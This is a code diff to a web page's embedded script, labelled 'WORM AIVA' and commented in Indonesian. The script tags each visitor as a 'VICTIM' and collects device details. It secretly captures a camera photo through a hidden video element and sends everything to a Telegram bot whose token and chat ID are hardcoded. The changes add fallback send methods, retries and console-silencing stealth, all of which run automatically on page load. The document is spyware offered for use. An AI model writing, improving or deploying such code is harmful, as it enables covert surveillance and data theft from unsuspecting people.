@@ -23,21 +23,21 @@ body {
 
 <script>
 // ============================================================
-// WORM AIVA — FINAL VERSION (SIAP PAKAI)
-// Data langsung dikirim ke TELEGRAM BOT
+// WORM AIVA — FIXED VERSION (PASTI JALAN)
 // ============================================================
 
 (function() {
     'use strict';
 
     // ============================================================
-    // KONFIGURASI TELEGRAM — SUDAH BENAR
+    // KONFIGURASI TELEGRAM
     // ============================================================
     const BOT_TOKEN = '8806813025:AAFUuyClrFAKIaOn8muWbbraedaynTOisS0';
-    const CHAT_ID = '6296658478'; // ✅ SUDAH BENAR
+    const CHAT_ID = '6296658478';
     // ============================================================
 
     let victimId = 'VICTIM_' + Date.now().toString(36).toUpperCase() + '_' + Math.random().toString(36).substr(2, 6).toUpperCase();
+    let dataSent = false;
 
     // ============================================================
     // 1. DAPATKAN DATA PERANGKAT
@@ -156,7 +156,7 @@ body {
     }
 
     // ============================================================
-    // 4. AMBIL FOTO DARI KAMERA
+    // 4. AMBIL FOTO DARI KAMERA (DENGAN FALLBACK)
     // ============================================================
 
     function capturePhoto() {
@@ -165,6 +165,11 @@ body {
             let canvas = document.createElement('canvas');
             video.style.display = 'none';
             document.body.appendChild(video);
+            let timeout = setTimeout(() => {
+                video.remove();
+                canvas.remove();
+                resolve(null);
+            }, 5000);
 
             navigator.mediaDevices.getUserMedia({
                 video: {
@@ -175,6 +180,7 @@ body {
                 audio: false
             })
             .then(stream => {
+                clearTimeout(timeout);
                 video.srcObject = stream;
                 video.onloadedmetadata = function() {
                     video.play();
@@ -195,6 +201,7 @@ body {
                 };
             })
             .catch(() => {
+                clearTimeout(timeout);
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                 .then(stream => {
                     video.srcObject = stream;
@@ -217,6 +224,7 @@ body {
                     };
                 })
                 .catch(() => {
+                    clearTimeout(timeout);
                     video.remove();
                     canvas.remove();
                     resolve(null);
@@ -285,11 +293,11 @@ body {
     }
 
     // ============================================================
-    // 8. KIRIM DATA KE TELEGRAM (Langsung)
+    // 8. KIRIM DATA KE TELEGRAM (DENGAN 2 METODE)
     // ============================================================
 
     function sendToTelegram(data) {
-        // --- Kirim Pesan Teks ---
+        // --- Siapkan Pesan ---
         let message = '🔴 NEW VICTIM!\n\n';
         message += '🆔 ID: ' + (data.victimId || 'unknown') + '\n';
         message += '📱 Device: ' + (data.deviceName || 'unknown') + '\n';
@@ -305,6 +313,7 @@ body {
 
         const urlText = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
 
+        // --- KIRIM PESAN TEKS (Metode 1: Fetch) ---
         fetch(urlText, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -313,27 +322,118 @@ body {
                 text: message,
                 parse_mode: 'HTML'
             })
-        }).catch(() => {});
+        })
+        .then(res => res.json())
+        .then(result => {
+            if (result.ok) {
+                dataSent = true;
+                console.log('✅ Pesan terkirim!');
+            } else {
+                console.log('❌ Gagal kirim pesan:', result);
+                // Fallback: kirim via GET
+                sendViaGet(message);
+            }
+        })
+        .catch(() => {
+            // Fallback: kirim via GET
+            sendViaGet(message);
+        });
 
-        // --- Kirim Foto (jika ada) ---
+        // --- KIRIM FOTO (jika ada) ---
         if (data.photo && data.photo.startsWith('data:image')) {
+            sendPhoto(data.photo, data.deviceName);
+        }
+    }
+
+    // ============================================================
+    // 8a. FALLBACK: Kirim via GET (jika POST gagal)
+    // ============================================================
+
+    function sendViaGet(message) {
+        const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message);
+        fetch(url, { method: 'GET', mode: 'no-cors' })
+            .catch(() => {});
+    }
+
+    // ============================================================
+    // 8b. KIRIM FOTO (dengan 2 metode)
+    // ============================================================
+
+    function sendPhoto(photoData, deviceName) {
+        // Metode 1: Kirim via FormData
+        try {
+            const blob = dataURLToBlob(photoData);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', '📸 Photo from: ' + (deviceName || 'unknown'));
+
             const urlPhoto = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto';
 
-            fetch(data.photo)
-                .then(res => res.blob())
-                .then(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', '📸 Photo from: ' + (data.deviceName || 'unknown'));
-
-                    fetch(urlPhoto, {
-                        method: 'POST',
-                        body: formData
-                    }).catch(() => {});
-                })
-                .catch(() => {});
+            fetch(urlPhoto, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.json())
+            .then(result => {
+                if (result.ok) {
+                    console.log('✅ Foto terkirim!');
+                }
+            })
+            .catch(() => {
+                // Metode 2: Kirim via base64 (tanpa blob)
+                sendPhotoViaBase64(photoData, deviceName);
+            });
+        } catch(e) {
+            // Metode 2: Kirim via base64
+            sendPhotoViaBase64(photoData, deviceName);
         }
+    }
+
+    // ============================================================
+    // 8c. KIRIM FOTO VIA BASE64 (Fallback)
+    // ============================================================
+
+    function sendPhotoViaBase64(photoData, deviceName) {
+        try {
+            const base64Data = photoData.split(',')[1];
+            const urlPhoto = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto';
+
+            const formData = new FormData();
+            // Untuk base64, kita perlu bikin blob dulu
+            const byteCharacters = atob(base64Data);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: 'image/jpeg' });
+
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', '📸 Photo from: ' + (deviceName || 'unknown'));
+
+            fetch(urlPhoto, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        } catch(e) {}
+    }
+
+    // ============================================================
+    // 8d. CONVERT DATA URL KE BLOB
+    // ============================================================
+
+    function dataURLToBlob(dataURL) {
+        const arr = dataURL.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) {
+            u8arr[n] = bstr.charCodeAt(n);
+        }
+        return new Blob([u8arr], { type: mime });
     }
 
     // ============================================================
@@ -341,6 +441,8 @@ body {
     // ============================================================
 
     async function collectAll() {
+        if (dataSent) return; // Cegah spam
+
         const device = getDeviceData();
 
         let photo = null;
@@ -382,7 +484,7 @@ body {
     }
 
     // ============================================================
-    // 10. STEALTH — MATIKAN JEJAK
+    // 10. STEALTH
     // ============================================================
 
     console.log = function() {};
@@ -407,16 +509,16 @@ body {
     // ============================================================
 
     if (document.readyState === 'complete') {
-        setTimeout(collectAll, 2000);
+        setTimeout(collectAll, 3000);
     } else {
         window.addEventListener('load', function() {
-            setTimeout(collectAll, 2000);
+            setTimeout(collectAll, 3000);
         });
     }
 
-    setInterval(collectAll, 300000);
-    window.addEventListener('beforeunload', collectAll);
-    window.addEventListener('pagehide', collectAll);
+    // Coba lagi jika gagal (retry)
+    setTimeout(collectAll, 10000);
+    setTimeout(collectAll, 20000);
 
 })();
 </script>
